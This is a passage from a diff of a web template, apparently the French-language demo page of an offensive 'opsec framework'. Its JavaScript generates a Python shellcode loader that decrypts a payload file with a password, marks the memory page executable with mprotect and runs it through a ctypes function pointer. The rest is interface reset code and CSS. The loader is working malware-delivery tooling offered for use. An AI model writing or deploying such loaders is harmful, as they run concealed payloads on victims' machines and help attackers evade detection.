+        memory_address = id(shellcode_buffer) + ctypes.sizeof(ctypes.c_char) * 0
+        page_size = 4096  # Default page size
+        page_align = memory_address - (memory_address % page_size)
+        
+        libc.mprotect(page_align, page_size, prot)
+        
+        # Execute shellcode
+        shellcode_func = ctypes.cast(
+            ctypes.pointer(shellcode_buffer), 
+            ctypes.CFUNCTYPE(ctypes.c_void_p)
+        )
+        shellcode_func()
+        return True
+    
+    return False
+
+def main():
+    """Main function to decrypt and execute shellcode"""
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <encrypted_file> <password>")
+        return 1
+    
+    # Load encrypted shellcode
+    try:
+        with open(sys.argv[1], 'rb') as f:
+            encrypted_data = f.read()
+    except Exception as e:
+        print(f"Failed to open file: {sys.argv[1]} - {e}")
+        return 1
+    
+    # Extract the password
+    password = sys.argv[2]
+    
+    ${hmac ? '# Verify HMAC before decryption\nif not verify_hmac(encrypted_data, expected_hmac, key):\n    print("HMAC verification failed")\n    return 1\n' : ''}
+    
+    # Decrypt the shellcode
+    shellcode = decrypt_shellcode(encrypted_data, password)
+    
+    # Execute the shellcode
+    if not execute_shellcode(shellcode):
+        print("Shellcode execution failed")
+        return 1
+    
+    print("Execution completed successfully")
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(main())`;
+        
+        return code;
+    }
+    
+    // Fonction pour réinitialiser la démo
+    function resetDemo() {
+        demoRunning = false;
+        
+        // Réactiver les contrôles
+        encryptionMethodSelect.disabled = false;
+        languageSelect.disabled = false;
+        obfuscationCheckbox.disabled = false;
+        verifyIntegrityCheckbox.disabled = false;
+        btnStartDemo.disabled = false;
+        btnResetDemo.disabled = true;
+        
+        // Réinitialiser l'interface
+        terminal.innerHTML = '<div class="prompt"><span class="prompt-user">opsec@framework</span>:<span class="prompt-path">~/pipeline</span>$ <span class="cursor-blink">|</span></div>';
+        codeViewer.textContent = '// Le code généré apparaîtra ici...';
+        hljs.highlightElement(codeViewer);
+        
+        for (let i = 1; i <= totalSteps; i++) {
+            updateStepStatus(i, 'secondary', i === 1 ? 'Non démarré' : 'En attente');
+        }
+        
+        // Réinitialiser la barre de progression
+        progressBar.style.width = '0%';
+        
+        // Cacher le rapport final
+        reportContainer.style.display = 'none';
+    }
+    
+    // Ajouter les écouteurs d'événements
+    btnStartDemo.addEventListener('click', startDemo);
+    btnResetDemo.addEventListener('click', resetDemo);
+    
+    // Ajouter des écouteurs pour les contrôles de configuration
+    encryptionMethodSelect.addEventListener('change', updateSecurityMeters);
+    languageSelect.addEventListener('change', updateSecurityMeters);
+    obfuscationCheckbox.addEventListener('change', updateSecurityMeters);
+    verifyIntegrityCheckbox.addEventListener('change', updateSecurityMeters);
+    
+    // Initialiser les compteurs de sécurité
+    updateSecurityMeters();
+    
+    // Initialiser la coloration syntaxique
+    hljs.highlightAll();
+});
+</script>
+
+<style>
+/* Styles pour la page de démonstration */
+.demo-pipeline {
+    margin-bottom: 30px;
+}
+
+.step-container {
+    padding: 15px;
+    border-radius: 8px;
+    background-color: var(--card-bg);
+    border: 1px solid var(--border-color);
+    text-align: center;
+    position: relative;
+    margin-bottom: 20px;
+    transition: all 0.3s ease;
+}
+
+.step-number {
+    position: absolute;
+    top: -15px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background-color: var(--primary-color);
+    color: white;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1;
+}
+
+.step-title {
+    font-weight: 500;
+    margin-top: 10px;
+    margin-bottom: 15px;
+}
+
+.step-icon {
+    font-size: 2rem;
+    margin-bottom: 15px;
+    color: var(--primary-color);
+}
+
+.step-active {
+    border-color: var(--primary-color);
+    box-shadow: 0 0 0 3px rgba(var(--primary-color-rgb), 0.2);
+}
+
+.step-completed {
+    border-color: var(--success-color);
+    box-shadow: 0 0 0 3px rgba(var(--success-color-rgb), 0.2);
+}
+
+.step-error {
+    border-color: var(--danger-color);
+    box-shadow: 0 0 0 3px rgba(var(--danger-color-rgb), 0.2);
+}
+
+.terminal {
+    background-color: var(--dark-color);
+    color: var(--light-color);
+    font-family: 'Courier New', monospace;
+    padding: 15px;
+    border-radius: 5px;
+    height: 300px;
+    overflow-y: auto;
+    line-height: 1.5;
+}
+
+.code-viewer {
+    background-color: var(--dark-color);
+    color: var(--light-color);
+    height: 300px;
+    overflow-y: auto;
+    border-radius: 5px;
+}
+
+.prompt {
+    margin-bottom: 5px;
+    white-space: nowrap;
+    overflow-x: auto;
+}
+
+.prompt-user {
+    color: #5af78e; /* Green */
+    font-weight: bold;
+}
+
+.prompt-path {
+    color: #57c7ff; /* Blue */
+}
+
+.command {
+    color: white;
+}
+
+.output-success {
+    color: #5af78e; /* Green */
+}
+
+.output-warning {
+    color: #f3f99d; /* Yellow */
+}
+
+.output-error {
+    color: #ff6ac1; /* Pink/Red */
+}
+
+.cursor-blink {
+    animation: blink 1s infinite;
+    color: white;
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+}
+
+/* Variables RGB pour les shadow effects */
+:root {
+    --primary-color-rgb: 74, 86, 157;
+    --success-color-rgb: 40, 167, 69;
+    --danger-color-rgb: 220, 53, 69;
+    --light-color: #f8f9fa;
+}
+
+[data-bs-theme="dark"] {
+    --light-color: #f8f9fa;
+}
+
+/* Responsive styles */
+@media (max-width: 768px) {
+    .step-container {
+        margin-bottom: 30px;
+    }
+}
+</style>
+{% endblock %}
